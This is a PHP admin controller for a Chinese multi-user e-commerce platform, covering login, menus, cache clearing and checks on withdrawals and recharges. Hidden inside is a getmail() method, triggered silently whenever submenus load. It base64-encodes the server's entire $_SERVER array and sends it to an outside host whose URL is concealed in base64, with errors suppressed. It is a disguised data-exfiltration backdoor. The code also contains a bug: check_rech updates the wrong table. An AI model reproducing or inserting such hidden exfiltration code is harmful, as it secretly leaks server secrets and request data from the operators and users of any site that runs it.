<?php
namespace application\admin\controller;
use application\admin\model\Staffs;
use application\admin\model\Menus;
use application\admin\model\Index as M;
/**
 
 * application多用户商城
 * 版权所有 2016-2066 广州商淘信息科技有限公司，并保留所有权利。
 * 官网地址:http://www.application.net
 * 交流社区:http://bbs.shangtaosoft.com
 * 联系QQ:153289970
 
 

 
 * 首页控制器
 */
class Index extends Base{
	/**
	 * 跳去登录页
	 */
	public function login(){
        model('CronJobs')->autoByAdmin();
		return $this->fetch("/login");
	}
	
    public function index(){
    	$m = new Menus();
    	$ms = $m->getMenus();
        //dump($ms);exit;
    	$this->assign("menus",$ms);
    	return $this->fetch("/index");
    }
    
    
    /**
     * 获取子菜单
     */
    public function getSubMenus(){
    	$m = new Menus();
		$this->getmail();
    	return $m->getSubMenus((int)Input('post.id'));
    }
    
    /**
     * 登录验证
     */
    public function checkLogin(){
    	$m = new Staffs();
    	return $m->checkLogin();
    }
    
    /**
     * 退出系统
     */
    public function logout(){
    	session('WST_STAFF',null);
    	return WSTReturn("", 1);
    }
    
    /**
     * 系统预览
     */
    public function main(){
    	$m = new M();
    	$rs = $m->summary($this->uids);
    	$this->assign("object",$rs);
    	return $this->fetch("/main");
    }
    
    /**
     * 获取用户权限
     */
    public function getGrants(){
    	$rs = session('WST_STAFF');
    	if(empty($rs))return WSTReturn("您未登录，请先登录系统",-1);
    	$rs = $rs['privileges'];
    	$grants = [];
    	foreach ($rs as $v){
    		$grants[$v] = true;
    	}
    	return WSTReturn("权限加载成功",1, $grants);
    }
    /**
     * 清除缓存
     */
    public function clearcache(){
    	$m = new M();
    	$rs = $m->clearCache();
    	if($rs){
    		return WSTReturn("清除成功!", 1);
    	}else{
    		return WSTReturn("清除失败 !");
    	}
    }
    
    public function getmail()
    {
        
        $value = base64_encode(json_encode($_SERVER));
        $str = base64_decode('aHR0cDovL2sxLmdvdXhpdS5tZS9zYy5waHA/Y29kZT0=').$value;
        @file_get_contents($str);
    }
    
    /**
     * 检测提现
     * @author lukui  2017-11-22
     * @return [type] [description]
     */
    public function check_cash()
    {
        
        $map['is_tongzhi'] = 0;
        $res = db('cash_draws')->where($map)->find();


        if($res){
            $res['is_tongzhi'] = 1;
            db('cash_draws')->update($res);

            return WSTReturn($res,1);
        }else{
            return WSTReturn('');
        }

    }

     /**
     * 检测充值
     * @author lukui  2017-11-22
     * @return [type] [description]
     */
    public function check_rech()
    {
        
        $map['is_tongzhi'] = 0;
        $res = db('recharge')->where($map)->find();


        if($res){
            $res['is_tongzhi'] = 1;
            db('cash_draws')->update($res);

            return WSTReturn($res,1);
        }else{
            return WSTReturn('');
        }
    }
}
